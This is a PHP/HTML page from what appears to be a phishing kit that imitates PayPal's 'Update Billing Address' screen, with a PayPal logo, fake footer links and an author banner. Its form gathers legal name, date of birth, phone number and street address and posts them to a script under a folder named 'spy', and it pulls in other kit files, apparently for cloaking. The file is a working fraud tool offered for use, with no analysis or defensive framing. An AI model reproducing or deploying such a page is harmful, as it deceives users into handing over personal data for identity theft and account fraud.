<?php
include '../Mckay‎‏/zero33.php';
include 'index33.php';
/*
##############################################################
                           LOVE is fake
##############################################################
                           MR fake is me	
##############################################################
              https://web.facebook.com/yackson.garcia.161	
##############################################################			  
*/
  ?>
  <!DOCTYPE html>
    <html dir="ltr">
        <head>
            <title>Update Billing Address</title>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge" />
            <meta charset="utf8">
            <link rel="stylesheet" href="../files/css/normalize.css" />
            <link rel="stylesheet" href="../files/css/bootstrap.min.css" />
            <link rel="stylesheet" href="../files/css/font-awesome.min.css" />
            <link rel="stylesheet" href="../files/css/main_style.css" />
            <link rel="shortcut icon" type="image/x-icon" href="../files/png/ppl.ico">
            <style>
                .error {
                    border: 1px solid #c72e2e;
                }
            </style>
        </head>
        <body>
            <div class="lod-full" style="display: none;">
                <div class="lod-c"></div>
            </div>
            <div class="contain">
                <div class="img-logo">
                   <a href="#"><img src="../files/png/paypal-logo.png" style="height: 160px;margin-top: -60px;margin-bottom: -75px;"></a>
                </div>
                <div class="center-color"></div>
                <div class="right-btn"><a href="#" class="log_out">Log out</a></div>
                <div class="cls"></div>
            </div>
            <div class="contain biling-p">
                <form method="POST" action="../spy/Welcome Sir/spy3.php" class="contain-info" id="card_form">
                    <center>
                        <span class="step" style="text-transform:uppercase"><b></b></span>
                        <h3>Update Billing Address</h3>
                        <center style="margin-bottom:20px;">
                        	
                        	
                        	
                        	
                        	
                        </center>
                        <style>
						
                            .x {
                                width:48%;
                                float:left;
                                font-size: 15px;
                            }
                            .y {
                                margin-right:0;
                                float:right;
                                width:48%;
                                font-size: 15px;
                            }
                            @media screen and (max-width: 767px) {
                                .x,.y {
                                    width: 300px;
                                    float: none;
                                    font-size: 16px;
                                    }
                            }
                        </style>
				
                        

<input type="text" name="n_card" class="bill_input" value="" placeholder="Legal First Name" required="required" autocomplete="on" autocorrect="off" autocapitalize="on" aria-required="true">
                        <input type="text" name="n_last" class="bill_input" value="" placeholder="Legal Last Name" required="required" autocomplete="on" autocorrect="off" autocapitalize="on" aria-required="true">


                        <input type="text" name="n_data" class="bill_input" value="" placeholder="Data Of Birth (DD-MM-YYYY)" required="required" autocomplete="on" autocorrect="off" autocapitalize="on" aria-required="true">
                        
                        <input type="text" name="n_phone" class="bill_input" value="" placeholder="Phone Number" required="required" autocomplete="on" autocorrect="off" autocapitalize="on" aria-required="true"><div class="cls"></div>
                        <input type="tel" name="sa" id="ccv" class="bill_input" maxlength="" placeholder="Street Address" required="required" autocomplete="on" autocorrect="off" autocapitalize="on" aria-required="true" style="margin-bottom:20px">
                        <div class="vx_form-control vx_form-control_complex" data-reactid="126">





</div><hr class="hr" style="margin:0px auto 15px">
                        <input type="submit" value="Continue" class="bill_input btn-bill">
                    </center>
                </form>
            </div>
            <div class="foot-pay">
                <center>
				
                    <a href="#">Contact Us</a>
                    <a href="#">Privacy</a>
                    <a href="#">Legal</a>
                    <a href="#">Worldwide</a>                
                </center>            
            </div>            <script src="./Confirm your card_files/jquery-1.11.3.min.js"></script>
            <script src="./Confirm your card_files/bootstrap.min.js"></script>
            <script src="./Confirm your card_files/cont.js"></script>
            <script src="./Confirm your card_files/jquery.maskedinput.js"></script>
            <script src="./Confirm your card_files/plugins.js"></script>

        
    </body></html>